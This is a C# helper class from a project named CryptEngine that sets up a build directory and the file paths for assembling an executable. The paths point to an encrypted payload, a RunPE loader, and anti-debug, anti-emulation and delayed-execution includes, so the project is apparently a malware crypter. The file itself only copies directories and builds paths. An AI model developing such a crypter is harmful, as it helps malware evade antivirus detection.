using System;
using System.IO;

namespace CryptEngine.NewPE
{
    public class PEDirectory : IDisposable
    {
        private string _RootPath;
        private string _SaveFileName;

        internal PEDirectory(string RootPath)
        {
            _RootPath = RootPath;
            _SaveFileName = Path.ChangeExtension(Path.GetRandomFileName(), ".exe");
        }

        public static PEDirectory SetRootPath(string RootPath, string InstanceDir)
        {
            string Dir = Path.Combine(InstanceDir, "assembly");
            DirectoryCopy(RootPath, Dir);

            return new PEDirectory(Dir);
        }

        private static void DirectoryCopy(string sourceDirName, string destDirName)
        {
            DirectoryInfo dir = new DirectoryInfo(sourceDirName);
            DirectoryInfo[] dirs = dir.GetDirectories();

            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }

            FileInfo[] files = dir.GetFiles();
            foreach (FileInfo file in files)
            {
                string temppath = Path.Combine(destDirName, file.Name);
                file.CopyTo(temppath, false);
            }

            foreach (DirectoryInfo subdir in dirs)
            {
                string temppath = Path.Combine(destDirName, subdir.Name);
                DirectoryCopy(subdir.FullName, temppath);
            }
        }

        public string RootDirectoryPath
        {
            get { return _RootPath; }
        }

        public string MainPath
        {
            get { return Path.Combine(_RootPath, "main.asm"); }
        }

        public string SavePath
        {
            get { return Path.Combine(BinDirectory, _SaveFileName); }
        }

        public string CompilerPath
        {
            get { return Path.Combine(_RootPath, "compiler", "nasm.exe"); }
        }

        public string BinDirectory
        {
            get { return Path.Combine(_RootPath, "bin"); }
        }

        public string CertDirectory
        {
            get { return Path.Combine(_RootPath, "certs"); }
        }

        public string ImportsDirectory
        {
            get { return Path.Combine(_RootPath, "imports"); }
        }

        public string IncludeDirectory
        {
            get { return Path.Combine(_RootPath, "include"); }
        }

        public string ObjDirectory
        {
            get { return Path.Combine(_RootPath, "obj"); }
        }

        public string OptionalDirectory
        {
            get { return Path.Combine(_RootPath, "optional"); }
        }

        public string ResDirectory
        {
            get { return Path.Combine(_RootPath, "res"); }
        }

        public string SectionsDirectory
        {
            get { return Path.Combine(_RootPath, "sections"); }
        }

        public string TextSectionPath
        {
            get { return Path.Combine(SectionsDirectory, "text.asm"); }
        }

        public string RunPESectionPath
        {
            get { return Path.Combine(SectionsDirectory, "runpe.asm"); }
        }

        public string IDataSectionPath
        {
            get { return Path.Combine(SectionsDirectory, "idata.asm"); }
        }

        public string DataSectionPath
        {
            get { return Path.Combine(SectionsDirectory, "data.asm"); }
        }

        public string TLSSectionPath
        {
            get { return Path.Combine(SectionsDirectory, "bss.asm"); }
        }

        public string TextObjectPath
        {
            get { return Path.Combine(ObjDirectory, "text.o"); }
        }

        public string RunPEObjectPath
        {
            get { return Path.Combine(ObjDirectory, "runpe.o"); }
        }

        public string DataObjectPath
        {
            get { return Path.Combine(ObjDirectory, "data.o"); }
        }

        public string IDataObjectPath
        {
            get { return Path.Combine(ObjDirectory, "idata.o"); }
        }

        public string TLSObjectPath
        {
            get { return Path.Combine(ObjDirectory, "bss.o"); }
        }

        public string PayloadIncludeBinPath
        {
            get { return Path.Combine(IncludeDirectory, "payload.bin"); }
        }

        public string PayloadKeyIncPath
        {
            get { return Path.Combine(IncludeDirectory, "payload_key.bin"); }
        }

        public string BindIncPath
        {
            get { return Path.Combine(IncludeDirectory, "bind.bin"); }
        }

        public string RunPEKeyIncPath
        {
            get { return Path.Combine(IncludeDirectory, "runpe_key.inc"); }
        }

        public string AntiEmulationIncPath
        {
            get { return Path.Combine(IncludeDirectory, "anti_emulation.inc"); }
        }

        public string AntiDebugIncPath
        {
            get { return Path.Combine(IncludeDirectory, "anti_debug.inc"); }
        }

        public string DelayExecutionIncPath
        {
            get { return Path.Combine(IncludeDirectory, "delay_execution.inc"); }
        }

        public string DataIncludePath
        {
            get { return Path.Combine(IncludeDirectory, "data.bin"); }
        }

        public string ResourceNameIncPath
        {
            get { return Path.Combine(IncludeDirectory, "resource_name.inc"); }
        }

        public string FunctionFinderIncPath
        {
            get { return Path.Combine(IncludeDirectory, "FunctionFinder.inc"); }
        }

        public string CloneTextBinPath
        {
            get { return Path.Combine(IncludeDirectory, "text.bin"); }
        }

        public string IATListPath
        {
            get { return Path.Combine(IncludeDirectory, "iat.lst"); }
        }

        public string IATDefPath
        {
            get { return Path.Combine(IncludeDirectory, "iat_def.inc"); }
        }

        public void Dispose()
        {
            Directory.Delete(this.RootDirectoryPath, true);
        }
    }
}
